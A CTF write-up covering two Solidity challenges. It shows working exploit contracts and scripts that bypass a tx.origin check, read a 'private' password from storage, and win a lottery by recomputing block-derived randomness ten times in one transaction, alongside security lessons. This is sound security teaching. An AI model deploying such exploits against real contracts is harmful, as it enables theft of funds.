---
title: '[CSSCTF] Blockchain: Gateway & Lottery'
date: '2026-10-02'
description: Comprehensive writeup for the Blockchain challenges (Gateway & Lottery) in CSSCTF — EVM storage layout, tx.origin bypass, and block-variable pseudo-randomness.
categories: [CSSCTF, Blockchain]
tags: [cssctf, blockchain, smart-contract, ethereum, web3]
series: [CSSCTF 2026]
showAuthor: false
showTableOfContents: true
---

# CSS CTF — Blockchain: **Gateway** (Part 1)

> This document covers **two CSS CTF blockchain challenges** (each maintaining dedicated numbered sections):
> - **Part 1 — Gateway** (port `31337`) — detailed below.
> - **Part 2 — Lottery** (port `31338`) — located in the second half of this document, beginning at `# CSS CTF — Blockchain: **Lottery** (Part 2)`.

> **Flag:** `CSSCTF{CSS{B451C_BL0CKCH41N_5K1LL5}}`  
> (`nc 34.116.80.78 31337` -> action `3` returns `CSS{B451C_BL0CKCH41N_5K1LL5}`)

| Parameter | Value |
|---|---|
| Category | Blockchain (Solidity / EVM) |
| Files | `Gate.sol`, `Setup.sol` |
| Chain | Anvil (Foundry) private chain, `chainId = 1`, each EOA prefunded with `5000 ETH` |
| Endpoint | `nc 34.116.80.78 31337` — menu `1/2/3`, **ticket = team name (case-sensitive)** |
| Core Techniques | `tx.origin` vs `msg.sender`, `receive()`, storage layout and packing, "private" visibility vs data secrecy, `keccak256(abi.encodePacked(...))` |

---

## 1. Challenge Description

> "The reboot has awakened an abandoned UPDC checkpoint guarding access to the Quantum Nexus
> Network. Its emergency gate still demands three proofs of clearance, but the officers who
> issued them vanished during The Severance. Find your way through all three doors and claim
> the credentials left inside. The ticket is your team name, case-sensitive."

The narrative regarding the UPDC checkpoint, Quantum Nexus, and The Severance provides background lore. The core mechanics reside strictly in the **three doors** defined in the contract.

### `Gate.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract Gate {
    address public owner;      // slot 0
    bytes32 private password;  // slot 1
    bool private stepped;      // slot 2
    bool private funded;       // slot 3      <-- INCORRECT COMMENT (see Section 4.3)
    bool public solved;        // slot 4      <-- INCORRECT COMMENT

    constructor() payable {
        owner = msg.sender;
        password = keccak256(abi.encodePacked("gateway to the flag"));
    }

    /// @notice Door 1: only a contract may pass.
    function enter() external {
        require(tx.origin != msg.sender, "Gate: must be called from a contract");
        stepped = true;
    }

    /// @notice Door 2: pay homage in plain ether.
    receive() external payable {
        require(stepped, "Gate: complete door 1 first");
        require(msg.value > 0, "Gate: send some ether");
        funded = true;
    }

    /// @notice Door 3: speak the password.
    function claim(bytes32 _password) external {
        require(stepped, "Gate: complete door 1 first");
        require(funded, "Gate: complete door 2 first");
        require(_password == password, "Gate: wrong password");
        solved = true;
    }
}
```

### `Setup.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
import {Gate} from "./Gate.sol";

contract Setup {
    Gate public gate;
    constructor() payable { gate = (new Gate){value: msg.value}(); }
    function isSolved() external view returns (bool) { return gate.solved(); }
}
```

`Setup` is a standard factory and verifier: it deploys `Gate` (forwarding `msg.value`) and exposes `isSolved()`. To capture the flag, `isSolved()` must return `true`, meaning `gate.solved == true`.

---

## 2. Background Fundamentals

### 2.1 `tx.origin` vs `msg.sender`

- `msg.sender`: The immediate caller of the current execution frame (an EOA or a contract).
- `tx.origin`: The original EOA that signed and initiated the transaction. Across all nested execution frames, it remains constant.

In a call chain `EOA -> A -> B`:

| Variable | At Contract `A` | At Contract `B` |
|---|---|---|
| `msg.sender` | EOA address | Address of `A` |
| `tx.origin` | EOA address | EOA address |

- If an EOA calls `gate.enter()` directly: `msg.sender == tx.origin == EOA` -> **fails**.
- If an EOA invokes an exploit contract `A.pwn()`, which then calls `gate.enter()`: `msg.sender = A`, `tx.origin = EOA` -> **passes** (`tx.origin != msg.sender`).

This pattern is frequently used as a naive anti-bot or contract check, but is easily bypassed through contract indirection. Similar caller confusion historically enabled `tx.origin` phishing attacks.

### 2.2 `receive()` / `fallback()`

- `receive()` executes when a contract receives plain Ether with empty calldata (via `address(g).call{value: x}("")` or standard transfer).
- In this contract, `receive()` does not restrict `msg.sender` or `tx.origin`; any EOA or contract can invoke it. It only asserts `stepped == true` and `msg.value > 0`.
- To transfer Ether from inside a contract, use `address(g).call{value: v}("")` with `require(ok)` rather than `transfer()`. The legacy `transfer()` primitive forwards a fixed 2,300 gas stipend, which reverts when the recipient executes storage operations. In `Gate.sol`, `receive()` executes a `require` check and updates a storage slot, requiring adequate gas.

### 2.3 EVM Storage Layout — "private" Is Not Confidential

- Every contract possesses a flat storage array consisting of 32-byte slots indexed from 0.
- Statically sized variables (`uintN`, `address`, `bool`, `bytesN`) are packed sequentially into slots when adjacent items fit within 32 bytes. Values are aligned starting from the lowest-order byte (offset 0).
- `private` and `internal` are Solidity-level visibility qualifiers: they prevent other contracts from reading the variable via ABI calls, but **provide zero cryptographic confidentiality**. Any actor can inspect raw storage via `eth_getStorageAt`. Therefore, `bytes32 private password` is completely public.

In this challenge, `password` is accessible via two vectors: reading slot 1 via RPC, or computing it deterministically offline from the constant `keccak256("gateway to the flag")`.

> **Note on Storage Layout:** The inline comments in `Gate.sol` indicate incorrect slot numbers (see Section 4.3).

### 2.4 `keccak256(abi.encodePacked(x))` vs `keccak256(abi.encode(x))`

- `abi.encodePacked("gateway to the flag")` concatenates raw UTF-8 bytes without padding or length prefixes:
  `keccak256(abi.encodePacked("gateway to the flag")) = 0x90cd83d75da724f03cbd4c1bd73dbfca4325ab5c4930082484b6f6aa9234d70b`
- `abi.encode("gateway to the flag")` adds an offset and 32-byte length prefix (96 bytes total), resulting in `0xc029662a...` which is incorrect.

Python equivalent:

```python
from eth_utils import keccak
pw = keccak(text="gateway to the flag")            # Equivalent to encodePacked
# pw.hex() = 90cd83d75da724f03cbd4c1bd73dbfca4325ab5c4930082484b6f6aa9234d70b
```

### 2.5 Execution Environment

The target runs on **Anvil** (`web3_clientVersion` -> `anvil/v1.8.3`): transactions auto-mine immediately without block wait times. Each instance provides a dedicated EOA funded with 5,000 ETH, making gas limits negligible. Instances auto-terminate after 30 minutes.

---

## 3. Analysis: The Three Doors and Solutions

| Door | Function | Requirement | Solution |
|---|---|---|---|
| 1 | `enter()` | `tx.origin != msg.sender` | Call via an intermediary attacker contract |
| 2 | `receive()` | `stepped == true` and `msg.value > 0` | Transfer at least 1 wei to the Gate address |
| 3 | `claim(bytes32)` | `stepped && funded && _password == password` | Supply `keccak256("gateway to the flag")` |

**Key Takeaway 1:** Only Door 1 requires execution through an intermediary contract. `receive()` and `claim()` enforce no restrictions on `msg.sender` or `tx.origin`. The minimal solve requires an intermediary contract only for Door 1, while Doors 2 and 3 can be satisfied directly by an EOA.

**Key Takeaway 2:** A strict execution sequence is required: `enter()` -> send Ether -> `claim()`. Sending Ether before Door 1 reverts because `stepped == false`.

**Key Takeaway 3:** `password` requires no cryptanalysis: a hardcoded string stored in a `private` slot is fully exposed.

---

## 4. Practical Reconnaissance and Verification

### 4.1 Instance Allocation

```
$ nc 34.116.80.78 31337
1 - launch new instance
2 - kill instance
3 - get flag
action? 1
ticket please: <TEAM_NAME, case-sensitive>

your private blockchain has been deployed
it will automatically terminate in 30 minutes
here's some useful information
uuid:           ...
rpc endpoint:   http://34.116.80.78:8545/<uuid>
private key:    0x...
setup contract: 0x...
```

The automation script `gate_launch.py` (pure sockets) manages the workflow: if the server reports `An instance is already running!`, it selects action `2` (kill) before selecting `1` (launch), then extracts `uuid`, `rpc`, `private key`, and `setup` via regex into `/tmp/gate_cfg.json`.

### 4.2 Inspecting On-Chain State

```
[*] ticket : TEST
[*] eoa    : 0x216d284eFC6b1565f62456b5a2f927f142cbD43E 5000 ETH
[*] setup  : 0x6DeF799dAfcc890a883feba3A90B3A827a614795
[*] gate   : 0x408c3d68178299094a768f03957E37EAdb1583F0     <- Setup.gate()
    slot 0 (owner                 ) = 0x...6def799dafcc890a883feba3a90b3a827a614795   (Setup contract address)
    slot 1 (password              ) = 0x90cd83d7...9234d70b
    slot 2 (stepped|funded|solved ) = 0x0000...0000
    slot 3, slot 4                 = 0x0000...0000 | 0x0000...0000  (EMPTY)
    keccak256(abi.encodePacked('gateway to the flag')) = 0x90cd83d7...9234d70b
    slot1 == password ? True
    isSolved()        = False
```

The on-chain deployment matches the source code, and the password matches our offline computation.

### 4.3 Storage Layout Trap: Misleading Source Comments

`Gate.sol` includes the following comments:

```solidity
bool private stepped;      // slot 2
bool private funded;       // slot 3
bool public  solved;       // slot 4
```

However, Solidity packs contiguous smaller types into a single 32-byte slot. Querying the compiler directly confirms this behavior:

```bash
python3 - <<'EOF' > /tmp/stdin.json
import json
print(json.dumps({
  "language": "Solidity",
  "sources": {"Gate.sol": {"content": open("Gate.sol").read()}},
  "settings": {"optimizer": {"enabled": True, "runs": 200},
               "outputSelection": {"*": {"*": ["storageLayout", "abi", "evm.bytecode.object"]}}}
}))
EOF
solcjs --standard-json < /tmp/stdin.json \
  | python3 -c 'import json,sys; print(json.dumps(json.load(sys.stdin)["contracts"]["Gate.sol"]["Gate"]["storageLayout"]["storage"], indent=1))'
```

```json
[ { "label": "owner",    "slot": "0", "offset": 0, "type": "t_address" },
  { "label": "password", "slot": "1", "offset": 0, "type": "t_bytes32" },
  { "label": "stepped",  "slot": "2", "offset": 0, "type": "t_bool" },
  { "label": "funded",   "slot": "2", "offset": 1, "type": "t_bool" },
  { "label": "solved",   "slot": "2", "offset": 2, "type": "t_bool" } ]
```

**All three variables (`stepped`, `funded`, and `solved`) are packed together in slot 2** at byte offsets 0, 1, and 2. Slots 3 and 4 remain completely empty (`0x0`).

On-chain state evolution during solving:

```
Initial state:         slot2 = 0x0000000000000000000000000000000000000000000000000000000000000000
After enter():         slot2 = 0x...01            (stepped = true)
After sending 1 wei:   slot2 = 0x...0101          (stepped = true, funded = true)
After claim():         slot2 = 0x...010101        (stepped = true, funded = true, solved = true) -> isSolved() = True
```

Relying on the source comments and inspecting `eth_getStorageAt(gate, 4)` to check `solved` will always return `0x0`, falsely suggesting the exploit failed. The proper verification is either masking slot 2 via `(w >> 16) & 1` or invoking `Setup.isSolved()`.

---

## 5. Exploitation

### 5.1 Path A — Single-Transaction Solve Across All Three Doors

`GateAttack.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IGate {
    function enter() external;
    function claim(bytes32 _password) external;
}

contract GateAttack {
    IGate immutable gate;
    constructor(address g) { gate = IGate(g); }

    function pwn(bytes32 pw) external payable {
        gate.enter();                                            // door 1
        (bool ok, ) = address(gate).call{value: msg.value}("");  // door 2 (receive())
        require(ok, "gate: fund failed");
        gate.claim(pw);                                          // door 3
    }

    receive() external payable {}
}
```

Why Door 1 passes: Inside `pwn()`, execution runs inside `GateAttack`. When invoking `gate.enter()`, `msg.sender = GateAttack`, while `tx.origin = EOA`. Because `tx.origin != msg.sender`, the check passes.

Compile:

```bash
solcjs --abi --bin --optimize --base-path . -o out_gate \
       Gate.sol Setup.sol GateAttack.sol GateEnter.sol
```

Deploy and execute (`gate_solve.py`, using `web3.py v8`):

```python
atk_factory = w3.eth.contract(abi=atk_abi, bytecode=atk_bin)
rc = send(atk_factory.constructor(GATE).build_transaction({"from": acct.address, "value": 0}))
atk = w3.eth.contract(address=rc.contractAddress, abi=atk_abi)
rc = send(atk.functions.pwn(pw).build_transaction({"from": acct.address, "value": 1}))  # 1 wei
```

Execution output:

```
[A] deploy GateAttack and call pwn() (1 tx: doors 1 + 2 + 3)
    GateAttack : 0x498c264d4d1f4C3AaA2478085469eB72b0d5303d | deploy gas 174601
    pwn() tx   : 0x1b415a2c8651a8b69f48040821212407a8664676c204289ff7e04d1c69f1dc26 | gas 58053
    isSolved() : True
```

### 5.2 Path B — Minimal Approach: Contract for Door 1 Only, EOA for Doors 2 and 3

`GateEnter.sol`:

```solidity
contract GateEnter {
    function open(address g) external { IGateEnter(g).enter(); }
}
```

Execution steps:

1. Call `GateEnter.open(gate)` from the EOA -> in `enter()`, `msg.sender = GateEnter` -> clears Door 1.
2. EOA transfers 1 wei directly to Gate (`{"to": gate, "value": 1}`) -> `receive()` triggers, setting `funded = true` (no contract required).
3. EOA invokes `gate.claim(pw)` -> sets `solved = true`.

Verified on a newly deployed clean `Setup` contract:

```
[B] fresh Setup: 0x499351b42b91B60Fd19d2371FF99D8efB4e83940 | fresh Gate: 0x9b12A3765ae3d7D765351137D9E6BAf429384198
    door 1: contract.enter() gas 46858 | slot2 = 0x1     -> stepped = 1
    door 2: EOA sends 1 wei  gas 26223 | slot2 = 0x101   -> funded  = 1
    door 3: EOA claim(pw)    gas 29223
    final slot2 = 0x10101 -> solved = 1
    fresh Setup isSolved() = True
```

Both paths succeed, demonstrating that only Door 1 actually restricts direct EOA calls.

---

## 6. Flag Capture

With `isSolved() == true`:

```bash
$ printf '3\nTEST\n' | nc 34.116.80.78 31337
1 - launch new instance
2 - kill instance
3 - get flag
action? ticket please: CSS{B451C_BL0CKCH41N_5K1LL5}
```

Submitted Flag:

```
CSSCTF{CSS{B451C_BL0CKCH41N_5K1LL5}}
```

---

## 7. Pitfalls, Common Errors, and Lessons Learned

**Challenge Traps:**

1. **Inaccurate storage comments in `Gate.sol`:** `funded` and `solved` reside in slot 2 alongside `stepped` (`0x01` -> `0x0101` -> `0x010101`). Reading slot 4 causes false negatives.
2. **Lore and narrative:** The "UPDC checkpoint" story is flavor text; contract logic is confined to the three defined functions.
3. **Over-engineering:** Door 1 suggests that the entire interaction requires a smart contract, whereas only Door 1 enforces this constraint.
4. **`private` variable confusion:** The `password` variable is treated as secret despite being deterministically computable and visible in slot 1 via RPC.

**Core Smart Contract Security Lessons:**

- Never store secrets, seeds, or validation credentials as plaintext or simple hashes on-chain; all storage is public. Confidentiality requires commit-reveal schemes, zero-knowledge proofs, or off-chain signatures.
- `tx.origin` is never a valid human-authentication check; always validate via `msg.sender`.
- `private` in Solidity merely disables compiler-generated ABI getters; it provides no data encryption.
- Always verify storage layouts via compiler artifacts (`storageLayout`) rather than trusting source comments.
- Inspect each `require` condition individually to determine where caller constraints are actually enforced.

**Scripting Gotchas Encountered:**

- `web3.py v8`: `HexBytes.hex()` omits the `0x` prefix; avoid mismatched string prefix comparisons.
- `build_transaction()` requires `{"from": ...}` for gas estimation.
- Manually constructed transactions (bypassing `build_transaction`) must supply explicit fee parameters (`maxFeePerGas`/`maxPriorityFeePerGas` or legacy `gasPrice`).
- `gate.functions.stepped()` does not exist because private variables lack getters; read raw storage instead.
- `solcjs` CLI lacks `--storage-layout`; use `--standard-json` with `outputSelection`.
- Instances are limited to one per ticket; terminate running instances before spawning new ones.
- Instances auto-expire after 30 minutes.

---

## 8. Appendix — Reproduction Files and Commands

```
Downloads/CSSCTF/BLOCKCHAIN/
├── Gate.sol            # Challenge source
├── Setup.sol           # Challenge source
├── GateAttack.sol      # Path A exploit (1 transaction, 3 doors)
├── GateEnter.sol       # Path B exploit (opens door 1 only)
├── gate_launch.py      # Socket script: instance lifecycle & config parser
├── gate_solve.py       # Storage recon, Path A & B execution, validation
└── out_gate/           # Compiled ABI and bytecode (solcjs)
```

```bash
# 1) Setup environment
python3 -m venv ~/.venvs/ctf && ~/.venvs/ctf/bin/pip install web3
npm i -g solc                                        # Provides solcjs

# 2) Compile contracts
cd ~/Downloads/CSSCTF/BLOCKCHAIN
solcjs --abi --bin --optimize --base-path . -o out_gate \
       Gate.sol Setup.sol GateAttack.sol GateEnter.sol

# 3) Allocate instance (ticket = team name, case-sensitive)
~/.venvs/ctf/bin/python gate_launch.py "<TEAM_NAME>"

# 4) Run exploit and verify on-chain
~/.venvs/ctf/bin/python gate_solve.py

# 5) Retrieve flag
printf '3\n<TEAM_NAME>\n' | nc 34.116.80.78 31337
```

**Summary:** The `password` is publicly readable in storage; `tx.origin != msg.sender` is bypassed via an intermediary contract; `receive()` accepts 1 wei without caller restrictions; and misleading storage layout comments are debunked using compiler layout analysis.

---

# CSS CTF — Blockchain: **Lottery** (Part 2)

> **Flag:** `CSSCTF{CSS{U5E_4_R4ND0M_FUNCT10N}}`  
> (`nc 34.116.80.78 31338` -> action `3` returns `CSS{U5E_4_R4ND0M_FUNCT10N}`)

| Parameter | Value |
|---|---|
| Category | Blockchain (Solidity / EVM) |
| Files | `Lottery.sol`, `Setup.sol` (distributed as `Setup(1).sol`) |
| Chain | Anvil **v1.8.3**, `chainId = 1`, each EOA prefunded with `5000 ETH` |
| Endpoint | `nc 34.116.80.78 31338` — menu `1/2/3`, **ticket = team name (case-sensitive)** |
| Win Condition | `Setup.isSolved() == true`, indicating `lottery.winner() != address(0)` |
| Core Technique | Pseudo-randomness derived from block variables (`blockhash`, `block.timestamp`, `block.difficulty`/`prevrandao`) can be computed deterministically **within the same transaction** via an attacker contract |
| Brute-Force Probability | $(1/100)^{10} = 10^{-20}$ — mathematically infeasible; deterministic prediction is required |

---

## 1. Challenge Description

> "Beyond the checkpoint, a Beltway Bandits gambling terminal has resumed broadcasting:
> *Ten wins in a row. One fortune. No second chances.* Once used to distribute stolen credits,
> it now holds an access key to the Bandits' hidden network. Beat the house and claim it before
> they return to collect. The ticket is your team name, case-sensitive."

The objective is simple: **win the lottery 10 consecutive times**.

### `Lottery.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract Lottery {
    uint256 public constant STREAK_TO_WIN = 10;

    mapping(address => uint256) public streaks;
    address public winner;

    event Guessed(address indexed guesser, uint256 target, bool correct);

    /// @notice A totally random number, sourced from the blockchain itself.
    function random() public view returns (uint256) {
        return uint256(
            keccak256(
                abi.encodePacked(
                    blockhash(block.number - 1),
                    block.timestamp,
                    block.difficulty
                )
            )
        );
    }

    function guess(uint256 _guess) external {
        uint256 target = random() % 100;
        bool correct = _guess == target;

        if (correct) {
            streaks[msg.sender] += 1;
            if (streaks[msg.sender] >= STREAK_TO_WIN) {
                winner = msg.sender;
            }
        } else {
            streaks[msg.sender] = 0;   // A single incorrect guess resets the streak to 0
        }

        emit Guessed(msg.sender, target, correct);
    }
}
```

### `Setup.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
import {Lottery} from "./Lottery.sol";

contract Setup {
    Lottery public lottery;

    constructor() { lottery = new Lottery(); }

    function isSolved() external view returns (bool) {
        return lottery.winner() != address(0);
    }
}
```

There are no `require()` assertions, no `tx.origin` checks, and no hidden storage slots. The challenge depends entirely on predicting `random() % 100` ten consecutive times.

Analysis of the three pseudo-random components:

| Component | EVM Semantics |
|---|---|
| `blockhash(block.number - 1)` | Hash of the **immediately preceding block** (valid for the 256 most recent blocks). |
| `block.timestamp` | Timestamp of the **currently executing block**. |
| `block.difficulty` | Post-Paris (The Merge), opcode `DIFFICULTY` returns `PREVRANDAO`, providing the **`mixHash` of the current block**. |

All three values are **invariant for all calls executed within the same block**. This forms the core vulnerability.

---

## 2. Core Principles and Fundamentals

### 2.1 Block-Derived Randomness Is Deterministic to Smart Contracts

In a transaction:

```
EOA ──tx──► Lottery.guess(guess_value)
              └─ target = keccak256(blockhash(n-1) || block.timestamp || prevrandao) % 100
```

All input variables are fixed as soon as the block is created. If an attacker contract computes the identical expression within the same transaction, it receives the exact value that `guess()` will evaluate against.

### 2.2 Why EOAs Cannot Precompute the Target

When signing a transaction from an EOA, transaction fields must be committed before the block including it is mined. The upcoming block's timestamp and `prevrandao` are unknown in advance. Furthermore, under Anvil's automine mechanism (1 transaction per block), each new transaction is mined into a new block where `blockhash(n-1)`, `block.timestamp`, and `prevrandao` differ from the preceding block.

This was empirically verified (Section 5): computing a guess from head block data and sending it via EOA predicted `79`, but the mined block target evaluated to `74`, resulting in failure and resetting the streak to `0`.

**Critical Takeaway:** The "10 wins in a row" requirement restricts only EOAs. A smart contract can invoke `guess()` **10 times within a single transaction**. Because all 10 calls share the exact same block state, `random()` evaluates to the **identical value**, achieving a 10/10 streak.

### 2.3 Mechanics of `abi.encodePacked(a, b, c)`

`encodePacked` concatenates raw byte arrays without padding. With `bytes32` for `blockhash`, 32 bytes for `block.timestamp`, and 32 bytes for `block.difficulty`, the result is a 96-byte payload: `parentHash || ts || prevrandao`.

```python
from eth_utils import keccak

def random_of_block(parent_hash: bytes, ts: int, prevrandao: int) -> int:
    packed  = parent_hash + ts.to_bytes(32, "big") + prevrandao.to_bytes(32, "big")
    return int.from_bytes(keccak(packed), "big")

def target_of_block(parent_hash: bytes, ts: int, prevrandao: int) -> int:
    return random_of_block(parent_hash, ts, prevrandao) % 100
```

> **Note on Offline Verification:** To verify offline, extract the mined block: set `parent_hash` to the hash of block `n - 1`, `ts` to block `n`'s timestamp, and `prevrandao` to block `n`'s **`mixHash`**. Do not use the RPC `difficulty` field (see Section 2.4).

### 2.4 `block.difficulty` on EVM Differs from RPC `difficulty`

Following The Merge, EVM opcode `DIFFICULTY` (0x44) maps to `PREVRANDAO`. Compilers for Paris or newer emit the following notice:

```
Warning: Since the VM version paris, "difficulty" was replaced by "prevrandao",
which now returns a random number based on the beacon chain.
```

Measured on-chain via `Probe.sol` (`eth_call`):

```
[evm view] block.number = 26101558   ts = 1790907009
           block.difficulty = 16309442122959647568758956656505451332577619934104229964068948587686416544685
           blockhash(block.number-1) = 0xd6a5c04d... (= hash of block 26101557, parent block)
[head RPC] number 26101558  ts 1790907009  field difficulty = 0  mixHash = 0x240ed12e...
=> block.difficulty == head.mixHash  ->  True
=> block.difficulty == head.difficulty (RPC field)  ->  False
```

The value perceived by the EVM is the block's `mixHash` (`prevrandao`). The `difficulty` field returned by `eth_getBlockByNumber` is legacy metadata (`0`), which yields incorrect results if used for offline calculations (`68` vs actual target `74`).

### 2.5 Ten Consecutive Guesses in a Single Transaction

```solidity
for (uint256 i = 0; i < 10; i++) { lottery.guess(roll()); }
```

All 10 message calls execute within the **same transaction and same block**. Consequently, `random()` remains constant across all 10 calls (target remains identical, e.g., `65`). Only a single calculation is necessary.

---

## 3. Instance Reconnaissance

```bash
$ printf '1\n<TEAM_NAME>\n' | nc 34.116.80.78 31338
1 - launch new instance
2 - kill instance
3 - get flag
action? ticket please:
your private blockchain has been deployed
it will automatically terminate in 30 minutes
here's some useful information
uuid:           f3ff3e06-125b-4820-987f-8ee6603470ad
rpc endpoint:   http://34.116.80.78:8546/f3ff3e06-125b-4820-987f-8ee6603470ad
private key:    0xbf44b708...04ff09
setup contract: 0xa7698A8397B10220d2A71EC85169f2f766CEeeA5
```

Reconnaissance steps:

1. Parse `rpc`, `private key`, and `setup` programmatically into `lot_cfg.json`.
2. Query `eth_chainId` and `setup.lottery()` to obtain the target address.
3. Verify contract state:

```python
setup = w3.eth.contract(address=SETUP, abi=SETUP_ABI)
lot_addr = setup.functions.lottery().call()
lot = w3.eth.contract(address=lot_addr, abi=LOT_ABI)
print(setup.functions.isSolved().call())        # False
print(lot.functions.streaks(me).call())         # 0
print(lot.functions.winner().call())            # 0x0000...0000
```

---

## 4. Exploitation — Path A: Internal Keccak Recomputation

`Attack.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface ILottery {
    function guess(uint256 _guess) external;
}

contract Attack {
    ILottery public lottery;

    constructor(address _lottery) { lottery = ILottery(_lottery); }

    // Identical to Lottery.random(), evaluated in the same block
    function roll() internal view returns (uint256) {
        return uint256(
            keccak256(
                abi.encodePacked(
                    blockhash(block.number - 1),
                    block.timestamp,
                    block.difficulty
                )
            )
        ) % 100;
    }

    function pwn() external {
        for (uint256 i = 0; i < 10; i++) {
            lottery.guess(roll());
        }
    }
}
```

Design details:

- `roll()` is marked `view`: it performs no state modifications and reads strictly block context variables.
- Type definitions in `abi.encodePacked` match the target contract: `bytes32, uint256, uint256`.
- The modulo operation `% 100` matches `target = random() % 100`.
- Because `Lottery.guess()` is invoked via regular message calls, `msg.sender` in `Lottery` is the address of `Attack`. Once `streaks[Attack] >= 10`, `winner` is set to `Attack`, satisfying `winner != address(0)` and making `Setup.isSolved() == true`.

Compile:

```bash
solcjs --abi --bin --optimize -o out Attack.sol
```

Deploy and execute:

```python
ATK = w3.eth.contract(abi=atk_abi, bytecode=atk_bin)
rc  = send(ATK.constructor(lot_addr).build_transaction({"from": acct.address}))
atk = w3.eth.contract(address=rc.contractAddress, abi=atk_abi)
rc  = send(atk.functions.pwn().build_transaction({"from": acct.address}))
assert rc.status == 1
```

---

## 5. Exploitation — Path B: Querying `lottery.random()` as an Oracle

Because `random()` is declared `public view`, an attacker contract can call the target contract directly to obtain the target number:

```solidity
interface ILotteryView {
    function random() external view returns (uint256);
    function guess(uint256 _guess) external;
}

contract AttackAlt {
    ILotteryView immutable lot;
    constructor(address _lot) { lot = ILotteryView(_lot); }

    function pwn() external {
        for (uint256 i = 0; i < 10; i++) {
            lot.guess(lot.random() % 100);   // Queries target oracle directly
        }
    }
}
```

Because `lot.random()` evaluates within the same transaction, it returns the exact value that `guess()` evaluates against.

### Empirical Proof of EOA Infeasibility

Attempting to predict targets from an EOA off-chain:

```
[evm] Guessing 79 based on (headhash, head_ts+1, head_difficulty_field) via EOA
  guess tx status 1, block 26101562, ts = parent_ts + 7
  event Guessed -> guesser <EOA> target 74 correct False
  streak EOA: 0

[offline verification of that block]
  recompute(parent_hash, ts, prevrandao) = 74   [Match: matches event]
  recompute(parent_hash, ts, difficulty) = 68   [Mismatch: RPC difficulty field is invalid]
```

Observed block timestamp deltas in this instance were non-deterministic: `+5s, +3s, +3s, +7s`. Predicting block timestamps from off-chain is practically infeasible, confirming that EOA-based precomputation is impossible.

---

## 6. Execution Results

Execution log on instance `f3ff3e06-...`:

```
rpc .../f3ff3e06-125b-4820-987f-8ee6603470ad
chainId 1 client anvil/v1.8.3 block 26101562
me 0xF9C67bf736c4b5c5F6b4De5478361E75D3D66eBA balance 4999.999829106 ETH
setup 0xa7698A8397B10220d2A71EC85169f2f766CEeeA5 lottery 0xad5c9e2c6e9D82d286f06bF9503eEc7b7Ae228a8
isSolved (before) = False

=== Path A : Attack.sol ===
  deploy Attack: 0x4e6acf1709Ed89b1271655439eb4bD8e89F328Ea gas 172194
  pwn() tx gas 120647 | target across 10 iterations: [65, 65, 65, 65, 65, 65, 65, 65, 65, 65]
  correct: 10/10 (all=True)
  streaks[0x4e6acf...F328Ea] = 10 | winner = 0x4e6acf...F328Ea

=== Path B : AttackAlt.sol ===
  deploy AttackAlt: 0x73686468822f7317C6946E1F7e0F0E8a1ee9aBc2 gas 152358
  pwn() tx gas 112421 | target across 10 iterations: [87, 87, 87, 87, 87, 87, 87, 87, 87, 87]
  correct: 10/10 (all=True)
  streaks[0x73686468822f7317C6946E1F7e0F0E8a1ee9aBc2] = 10 | winner = 0x73686468822f7317C6946E1F7e0F0E8a1ee9aBc2

isSolved (after) = True
[nc action 3] CSS{U5E_4_R4ND0M_FUNCT10N}
```

While Path A and Path B executed in different blocks and produced different targets (`65` vs `87`), all 10 calls within each respective block evaluated to the identical number.

Submitted Flag:

```
CSSCTF{CSS{U5E_4_R4ND0M_FUNCT10N}}
```

---

## 7. Reproduction Scripts and Instructions

```
Downloads/CSSCTF/BLOCKCHAIN/
├── Lottery.sol          # Challenge contract
├── Setup(1).sol         # Challenge Setup contract
├── Attack.sol           # Path A: Recomputed keccak(blockhash, ts, difficulty)
├── AttackAlt.sol        # Path B: Direct oracle query to lottery.random()
├── Probe.sol            # On-chain inspection of block.difficulty & blockhash
├── lot_launch.py        # Socket manager: instance lifecycle & config parser
├── lot_solve.py         # Automates Path A & B deployment, execution, verification
├── exp_predict.py       # Experiment: EOA off-chain prediction validation
├── exp_retro.py         # Verification of event targets against historical block data
├── lottery.abi          # Hand-crafted ABI including Guessed event
├── setup.abi
├── out/                 # Compiled Attack artifacts (Path A)
├── out_alt/             # Compiled AttackAlt artifacts (Path B)
└── out_probe/           # Compiled Probe artifacts
```

```bash
# 1) Setup environment
python3 -m venv ~/.venvs/ctf && ~/.venvs/ctf/bin/pip install web3
npm i -g solc                                  # Provides solcjs

# 2) Compile contracts
cd ~/Downloads/CSSCTF/BLOCKCHAIN
solcjs --abi --bin --optimize -o out        Attack.sol
solcjs --abi --bin --optimize -o out_alt    AttackAlt.sol
solcjs --abi --bin --optimize -o out_probe  Probe.sol

# 3) Launch instance (ticket = team name, case-sensitive)
~/.venvs/ctf/bin/python lot_launch.py <TEAM_NAME>

# 4) Execute exploit and verify on-chain
~/.venvs/ctf/bin/python lot_solve.py

# 5) Optional validation experiments
~/.venvs/ctf/bin/python exp_predict.py
~/.venvs/ctf/bin/python exp_retro.py

# 6) Retrieve flag
printf '3\n<TEAM_NAME>\n' | nc 34.116.80.78 31338
```

---

## 8. Pitfalls, Common Errors, and Lessons Learned

**Challenge Traps:**

1. **"Ten wins in a row" misconception:** Implies guessing 10 different random numbers; in practice, all 10 calls within a single transaction evaluate against the exact same target.
2. **`random()` declared `public view`:** Acts as an on-chain oracle for attacker contracts.
3. **`block.difficulty` semantics:** On post-Merge EVM chains, this opcode reflects `prevrandao` (`mixHash`). Using the RPC `difficulty` field for offline calculations yields incorrect numbers.
4. **`blockhash(block.number - 1)`:** Evaluates to the parent block's hash, not the current block's hash.

**Technical Scripting Gotchas:**

- `web3.py v8`: Passing `gasPrice` to `build_transaction()` when EIP-1559 fields are expected raises `TypeError: Unknown kwargs: ['gasPrice']`.
- Event decoding requires the explicit ABI definition of `Guessed` for receipt processing.
- Always check `receipt.status == 1`.
- Compiling complex multi-file projects with `solcjs` directly can result in import path resolution errors; manual ABI extraction for required interfaces is often cleaner.

**Security Recommendations for On-Chain Randomness:**

- **Never rely on block context variables** (`blockhash`, `timestamp`, `prevrandao`, `block.number`) as entropy sources for security-sensitive logic. All block attributes are transparent and constant across all execution frames within that block.
